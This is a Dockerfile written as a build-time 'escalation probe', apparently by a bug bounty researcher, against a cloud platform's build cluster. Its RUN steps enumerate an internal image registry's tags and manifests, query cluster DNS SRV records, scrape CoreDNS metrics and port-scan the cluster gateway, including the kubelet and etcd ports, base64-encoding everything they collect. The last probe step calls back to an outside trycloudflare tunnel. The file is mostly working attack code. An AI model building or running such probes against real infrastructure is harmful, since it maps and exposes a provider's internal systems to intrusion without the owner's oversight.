FROM python:3.11-slim
RUN apt-get update && apt-get install -y curl dnsutils && rm -rf /var/lib/apt/lists/*

RUN echo "=== ESCALATION PROBE START $(date -u) ==="

RUN echo "=== APPS_RUN_TAGS ===" && \
    curl -s -m 10 http://docker-cache.docker-cache.svc.cluster.local:5000/v2/digitaloceanapps/apps-run/tags/list 2>&1 | base64 && \
    echo ""

RUN echo "=== APPS_RUN_LATEST_MANIFEST ===" && \
    curl -s -m 10 -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
    http://docker-cache.docker-cache.svc.cluster.local:5000/v2/digitaloceanapps/apps-run/manifests/latest 2>&1 | base64 && \
    echo ""

RUN echo "=== GRAFANA_OTEL_TAGS ===" && \
    curl -s -m 10 http://docker-cache.docker-cache.svc.cluster.local:5000/v2/grafana/otel-lgtm/tags/list 2>&1 | base64 && \
    echo ""

RUN echo "=== DNS_SRV_SCAN ===" && \
    nslookup -type=SRV _http._tcp.docker-cache.svc.cluster.local 2>&1 | base64 && echo "" && \
    nslookup -type=SRV _https._tcp.kubernetes.default.svc.cluster.local 2>&1 | base64 && echo ""

RUN echo "=== COREDNS_METRICS ===" && \
    curl -s -m 5 http://10.245.0.10:9153/metrics 2>&1 | head -50 | base64 && echo ""

RUN echo "=== DOCKER_CACHE_DIRECT_IP ===" && \
    curl -s -m 5 http://10.245.31.54:5000/v2/ 2>&1 | base64 && echo ""

RUN echo "=== NET_SCAN_COMMON ===" && \
    for port in 80 443 8080 8443 9090 3000 5000 6443 10250 10255 2379; do \
        result=$(curl -s -m 2 -o /dev/null -w "%{http_code}" http://10.245.0.1:$port/ 2>&1); \
        echo "10.245.0.1:$port=$result"; \
    done | base64 && echo ""

RUN echo "=== OOB_CALLBACK ===" && \
    curl -s -m 5 -H "X-BBP-Researcher: mrunal" \
    "https://cheapest-vessel-hometown-equipped.trycloudflare.com/build-escalation-probe?result=done" 2>&1

RUN echo "=== ESCALATION PROBE END $(date -u) ==="

RUN mkdir -p /app && echo '<html><body>probe</body></html>' > /app/index.html
CMD ["python3", "-m", "http.server", "8080"]
